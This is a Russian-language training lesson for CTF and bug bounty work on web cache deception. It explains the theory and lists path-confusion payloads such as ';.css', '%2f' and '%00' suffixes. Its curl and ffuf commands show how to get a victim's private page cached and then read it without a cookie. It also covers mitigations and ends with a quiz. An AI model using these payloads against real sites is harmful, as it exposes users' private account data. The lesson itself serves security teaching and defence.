---
id: web-cache-deception
title: "Web Cache Deception: утечка приватных данных через кэш"
category: web
parent: web-cache-poisoning
difficulty: hard
order: 1
tags: [cache-deception, cache-poisoning, cdn, cdn, private-data, path-confusion]
prerequisites: [web-cache-poisoning, web-recon-fuzzing]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 34
summary: "Как заставить CDN закэшировать приватную страницу жертвы и затем прочитать её без аутентификации."
---

**Web Cache Deception (WCD)** — атака, при которой кэш (CDN/reverse-proxy) сохраняет **приватный** ответ, адресованный жертве, и затем отдаёт его атакующему. В отличие от cache **poisoning** (вы кладёте своё в кэш для всех), deception — вы заставляете кэш сохранить **чужое приватное**. Часто это цепочка: path confusion + расширение/разделитель + кэш-правило. Базовая идея есть в `web-cache-poisoning`; здесь — полный разбор техник и эксплуатации.

## Теория: суть атаки

CDN кэширует ответы, если путь выглядит «статическим» (по расширению `.css`, `.js`, `.png`) или по своим правилам. Приложение же роутит по **своему** правилу, часто игнорируя «лишний» суффикс.

Атакующий:

1. Заставляет жертву открыть `https://target/account/profile.css` (например, через `<img>` или ссылку в письме).
2. Приложение отдаёт профиль жертвы (игнорирует `.css`), а CDN считает `.css` статикой → кэширует **приватный** ответ.
3. Атакующий запрашивает тот же URL без cookie → CDN отдаёт закэшированный приватный ответ жертвы.

Итог: утечка PII/токенов/страницы аккаунта.

## Теория: техники path confusion

Ключ — заставить приложение и CDN **по-разному** интерпретировать путь:

| Техника | Пример | Почему работает |
|---------|--------|-----------------|
| Расширение | `/account.css` | CDN кэширует статику, app игнорирует суффикс |
| Разделитель `;` | `/account;.css` | некоторые фреймворки отрезают `;` |
| Encoded dot | `/account%2f.css` | декодирование расходится |
| Trailing slash | `/account/.css` | роутинг vs кэш |
| Null/`#` | `/account%23.css` | app обрезает, CDN — нет |
| Query | `/account?x.css` | кэш-правило по query |
| Path param | `/account/..%2fprofile.css` | traversal в роутинге |

Успех = app отдаёт приватный контент, а кэш сохраняет его как публичный.

## Теория: как проверить, что сработало

- Заголовки кэша: `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age`.
- `Cache-Control: public` в ответе на приватный запрос.
- Повторный запрос **без cookie** возвращает те же приватные данные.

## Инструменты и команды

Базовый тест (на своём аккаунте!):

```bash
# 1) приватный ответ с cookie
curl -s -i https://target.local/account -b 'session=me' | grep -iE 'cache-control|x-cache|age'
# 2) с «статическим» суффиксом
curl -s -i https://target.local/account.css -b 'session=me' | grep -iE 'cache-control|x-cache|age'
# 3) без cookie — если вернулись приватные данные, deception сработал
curl -s https://target.local/account.css | head -c 200
```

Burp: **Web Cache Deception** checker (в Scanner) или ручной Repeater. Также полезно сравнить ответы с/без cookie.

## Разобранный пример: утечка профиля

Шаг 1. Заходим своим аккаунтом, смотрим `/account` — приватные данные, `Cache-Control: private`.

Шаг 2. Пробуем `/account.css`:

```bash
curl -s -i https://target.local/account.css -b 'session=me' | grep -iE 'x-cache|cache-control'
# X-Cache: MISS, Cache-Control: public  => кэшируется!
```

Шаг 3. Запрашиваем без cookie:

```bash
curl -s https://target.local/account.css | grep -o 'your@email\|token'
# возвращает приватные данные => утечка
```

В отчёте: URL-техника, заголовки, доказательство чтения без аутентификации. **Не используйте чужие аккаунты** — только свой, чтобы продемонстрировать механизм.

## Разобранный пример: WCD через разделитель `;`

Если `/account.css` не работает (app возвращает 404 на несуществующее расширение), пробуем разделители, которые app «срезает»:

```bash
curl -s -i 'https://target.local/account;.css' -b 'session=me' | grep -iE 'x-cache|cache-control'
```

Многие Java/PHP-роутеры трактуют `;` как path-параметр и игнорируют хвост, а CDN видит `.css`. Если ответ приватный и `public` — сработало.

## Частые ошибки

- **Путать с poisoning.** Deception = сохранить **чужое приватное**; poisoning = положить **своё** для всех.
- **Тестировать на чужом аккаунте.** Используйте свой; иначе это уже утечка реальных данных.
- **Игнорировать `Cache-Control`.** `private`/`no-store` закрывают WCD.
- **Не пробовать разные разделители.** `.css` может не работать, а `;.css` — да.
- **Забывать про `Vary`.** `Vary: Cookie` делает приватные ответы некэшируемыми.

## Расширенная теория: какие заголовки решают судьбу кэша

Кэш решает, кэшировать ли ответ, по нескольким заголовкам. Их анализ — половина атаки.

| Заголовок | Роль | Опасность |
|-----------|------|-----------|
| `Cache-Control: public` | разрешает общий кэш | приватное кэшируется |
| `Cache-Control: no-store` | запрет кэша | безопасно |
| `Cache-Control: max-age=N` | время жизни | чем больше, тем хуже |
| `X-Cache: HIT/MISS` | состояние кэша | оракул «сработало ли» |
| `Age` | сколько секунд в кэше | подтверждает HIT |
| `Vary` | по каким заголовкам кэшировать | узкий `Vary` → коллизии |
| `Set-Cookie` | обычно запрещает кэш | если кэшируется — утечка |
| `CDN-Cache-Control` | отдельно для CDN | можно переопределить |

```bash
# проверяем состояние кэша
curl -sI https://app.example/account | grep -iE 'x-cache|age|cache-control|vary'
# X-Cache: HIT   -> ответ из кэша
# Age: 42        -> закэширован 42 секунды назад
```

## Техники path confusion: полный набор

Ключ WCD — заставить кэш считать путь статическим (`/x.css`), а приложение — динамическим (`/account`).

```text
/account/nonexistent.css          # статика после динамического пути
/account;.css                     # точка с запятой как разделитель
/account%2f.css                   # закодированный слэш
/account/..%2faccount             # нормализация
/account.css%00                   # null byte
/account%23.css                   # fragment
/account?x=y.css                  # суффикс в query
```

Приложение нормализует `;`/`%2f` и отдаёт профиль; CDN видит расширение `.css` и кэширует. Дальше атакующий запрашивает тот же URL и получает **чужой** профиль из кэша.

## Разобранный пример: Web Cache Deception на профиле

```bash
# 1) атакующий готовит ссылку
https://app.example/account/nonexistent.css

# 2) жертва, будучи залогинена, открывает ссылку
# 3) CDN кэширует ответ (профиль жертвы) под ключом .../nonexistent.css
curl -sI 'https://app.example/account/nonexistent.css' | grep -iE 'x-cache|age'
# X-Cache: HIT

# 4) атакующий запрашивает тот же URL БЕЗ cookie
curl -s 'https://app.example/account/nonexistent.css' | grep -i 'email\|csrf'
# видит данные жертвы
```

Подтверждение — разница между ответом с `X-Cache: HIT` (данные жертвы) и `MISS` (свои/анонимные данные).

## Разобранный пример: обход через разделитель и query

```bash
# вариант через ; — приложение режет ;, CDN видит .css
curl -sI 'https://app.example/account;foo=bar.css' | grep -i x-cache
# вариант через encoded slash
curl -sI 'https://app.example/account%2faccount' | grep -i x-cache
# вариант через .json/.ico/.txt
curl -s 'https://app.example/account/x.ico'
```

Всегда перебирайте расширения (`.css`, `.js`, `.json`, `.ico`, `.txt`, `.map`) и разделители (`;`, `%2f`, `%00`, `%23`), потому что конкретный CDN/сервер комбинирует их по-разному.

## Cache poisoning vs cache deception: разница

Важно не путать два близких класса:

| | Cache Deception | Cache Poisoning |
|---|-----------------|-----------------|
| Кого атакуют | одного пользователя (жертву) | всех пользователей |
| Механизм | приватный ответ кэшируется как публичный | вредоносный ответ кэшируется под общий ключ |
| Ключ | уникальный URL для жертвы | общий URL с unkeyed-входом |
| Инструмент | расширение `.css` | `X-Forwarded-Host`, `X-Forwarded-Scheme` |
| Эффект | утечка данных жертвы | XSS/редирект для всех |

Децепция — про «заставить закэшировать приватное»; пойзонинг — про «подменить контент у общего ключа». Урок `web-cache-poisoning` покрывает второй класс.

## Что делать дальше / решение

1. **Найдите кэшируемые маршруты.** Статика + динамика на одном хосте.
2. **Определите поведение CDN.** Какие расширения/разделители считаются статикой.
3. **Проверьте X-Cache/Age.** Есть ли HIT на «подделанном» пути.
4. **Проверьте приватность.** Кэшируется ли `Set-Cookie`-ответ, профиль, токены.
5. **Соберите PoC.** Ссылка + `X-Cache: HIT` + данные жертвы в ответе без cookie.
6. **Проверьте poisoning отдельно.** Unkeyed-заголовки — см. `web-cache-poisoning`.

## Практика и справочники

- **PortSwigger Academy** — «Web cache deception».
- **HackTricks** — «Cache Deception».
- **OWASP** — «Web Cache Deception Attack» (research).
- **`param-miner`** — поиск unkeyed-параметров/заголовков.

## Автоматизация поиска WCD

Ручная проверка масштабируется плохо — автоматизируйте перебор расширений и разделителей.

```bash
# 1) берём список динамических маршрутов (из краулера/истории)
cat urls.txt | grep -E '/account|/profile|/settings|/me' > dyn.txt
# 2) генерируем варианты «статического суффикса»
while read u; do
  for ext in css js json ico txt map; do
    echo "$u/nonexistent.$ext"
    echo "$u;.${ext}"
  done
done < dyn.txt > wcd_targets.txt
# 3) проверяем X-Cache/Age и кэшируемость
ffuf -u 'https://app.example/FUZZ' -w wcd_targets.txt -mc 200 \
  -H 'Cookie: <session>' -fr 'no-store' -o wcd.json
```

Смотрите не только на `200`, но и на `X-Cache: HIT` и `Age > 0` — именно они подтверждают, что ответ реально лёг в кэш. Для сравнения делайте запрос **с** cookie и **без** — разница в теле = утечка.

## Сводка: признаки уязвимости WCD

| Признак | Что означает |
|---------|--------------|
| `X-Cache: HIT` на `.css`-пути | ответ закэширован |
| `Age` растёт | кэш живёт |
| Тело без cookie = тело с cookie | приватное закэшировано |
| `Cache-Control: public` на `/account` | нет запрета кэша |
| `Vary` без `Cookie` | CDN не различает пользователей |
| 200 на `/account/x.css` | path confusion работает |

Если хотя бы три пункта совпали — почти наверняка WCD подтверждён, и остаётся собрать чистый PoC-URL для жертвы.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Чем cache deception отличается от poisoning?"
  options:
    - "Deception сохраняет приватный ответ жертвы; poisoning кладёт ваш ответ для всех"
    - "Ничем"
    - "Deception — это SQL-инъекция"
    - "Poisoning — это DNS"
  answer: 0
  explanation: "Deception = кэш сохраняет чужое приватное."
- question: "Какая техника заставляет app и CDN по-разному видеть путь?"
  options:
    - "Добавление `.css`/`;.css` к приватному URL"
    - "Смена DNS"
    - "Отправка `TRACE`"
    - "Отключение cookie"
  answer: 0
  explanation: "Path confusion: app игнорирует суффикс, CDN кэширует как статику."
- question: "Какой заголовок показывает, что ответ закэширован?"
  options:
    - "`X-Cache: HIT` / `CF-Cache-Status: HIT`"
    - "`Server`"
    - "`Referer`"
    - "`Vary`"
  answer: 0
  explanation: "HIT + `Age` указывают на попадание в кэш."
- question: "Как доказать утечку?"
  options:
    - "Запросить тот же URL без cookie и получить приватные данные"
    - "Сменить User-Agent"
    - "Открыть порт"
    - "Сменить пароль"
  answer: 0
  explanation: "Без аутентификации кэш отдаёт приватный ответ."
- question: "Что закрывает WCD на стороне приложения?"
  options:
    - "`Cache-Control: private`/`no-store` и `Vary: Cookie`"
    - "`Server`"
    - "`Age`"
    - "`Content-Length`"
  answer: 0
  explanation: "Запрет кэширования приватных ответов."
```

## Где пригодится

- **CTF (Web):** задачи на утечку через CDN-кэш.
- **Bug bounty:** WCD — известный класс с высокими выплатами.
- **Пентест:** аудит кэш-правил и роутинга за CDN.
- **Работа (AppSec/Dev):** `private`/`no-store`, `Vary: Cookie`, корректный роутинг.
